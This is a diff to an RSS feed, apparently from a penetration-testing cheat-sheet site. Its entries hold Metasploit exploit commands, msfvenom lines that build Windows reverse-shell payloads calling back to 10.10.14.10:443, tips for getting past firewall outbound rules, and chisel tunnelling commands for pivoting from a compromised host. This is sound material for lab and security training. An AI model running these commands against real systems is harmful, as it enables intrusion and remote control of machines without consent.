@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -26,14 +26,14 @@
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Windows x86 Staged exe Stageless exe # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.</description>
     </item>
     <item>
       <title>Network Traffic Pivoting</title>
       <link>https://tldrbins.github.io/network_traffic_privoting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_traffic_privoting/</guid>
-      <description>Chisel Download chisel&#xA;Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .</description>
+      <description>Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 Ports forwarding # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 Socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .</description>
     </item>
   </channel>
 </rss>
